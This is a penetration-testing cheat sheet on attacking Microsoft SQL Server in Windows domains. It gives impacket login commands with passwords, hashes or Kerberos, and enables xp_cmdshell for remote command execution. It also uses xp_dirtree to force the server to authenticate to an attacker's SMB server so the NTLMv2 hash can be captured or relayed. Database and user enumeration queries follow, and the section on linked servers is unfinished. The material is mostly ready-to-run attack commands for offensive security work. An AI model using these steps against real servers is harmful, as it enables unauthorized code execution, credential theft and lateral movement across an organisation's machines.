# Microsoft SQL service (port 1433)

If the Domain controller or any other windows machine have accessible Microsoft SQL service through the standar port 1433, or any custom port accessible, you can use a domain user credentials (or local user credentials) to login. In some cases this can lead to RCE through "xp_cmdshell" function, ntlm authentication relay through "xp_dirtree" function or get the NTLM v2 hash from the user running the service, enumerate databases, arbitrary querys, and migrate to other computers if are connected through "links".

You can login into the service using mssqlclient.py from impacket suite:

`mssqlclient.py <domain>/<user>:'<password>'@<ip>`

Pass-the-hash: `mssqlclient.py <domain>/user:@<ip> -hashes '<optional LM hash>:<NT hash>'`

Kerberos auth: `sudo rdate -n <ip> ; <domain>/<user>:'<password>'@<machine>.<domain> -k`

<br>

### Try an RCE:

Whatever user you loged in, try to use "xp_cmdshell" command to execute a command inside that machine:

`xp_cmdshell "whoami"`

If this fails for any reason (probably) try to enable this function with:

`enable_xp_cmdshell`

`reconfigure`

`xp_cmdshell "whoami"`

NOTE: Remember that 'sa' user is more likely to be able to run xp_cmdshell in the machine

<br>

### NTLM relay / hash grabbing

You can also try to get ntlmv2 hash for the user which is running the server. Then you can crack offline that hash to get credentials, or (if you suspect that credentials could have admin rights against another domain machine) you can use "ntlmrelayx" tool to relay the credentials and get RCE (or whatever) to second machine.

From your attacking machine: `smbserver.py -smb2support share .` (also "responder" tool will work)

Inside mssqlclient.py session: `xp_dirtree \\<your_smbserver_ip>\whatever`

For NTLM relay look for "responder" and "ntlmrelayx" functionalitys.

<br>

### Database enumeration:

Get all database: `EXEC sp_databases;` or `SELECT name FROM sys.databases;`

Use specific database: `USE <database name>;`

Get tables from current database: `SELECT name FROM sys.tables;` or `SELECT * FROM information_schema.tables;`

Get content from specific table: `SELECT * FROM <table name>;`

Get columns from specific table: `SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('<table name>');`

Enumerate users and roles: `SELECT name FROM sys.syslogins;`


Other information you can enumerate from the machine:
```
SELECT @@VERSION;               -- Sql server version
SELECT SERVERPROPERTY('MachineName');  -- Hostname
SELECT SERVERPROPERTY('Edition');      -- Edition (Express, Standard, etc.)
SELECT SERVERPROPERTY('InstanceName'); -- Instance name
SELECT SERVERPROPERTY('ProductLevel'); -- Patch level

SELECT name, type_desc FROM sys.server_principals;   -- Server users
SELECT name, type_desc FROM sys.database_principals; -- Database users

SELECT * FROM sys.dm_exec_sessions;       -- Active sessions and connections
SELECT * FROM sys.dm_exec_connections;

SELECT * FROM sys.dm_exec_requests;       -- SQL process
```

<br>

### Links

Working on this seccion....

<br>

Other interesting articles: https://one2bla.me/Breach-operations/attacking-mssql


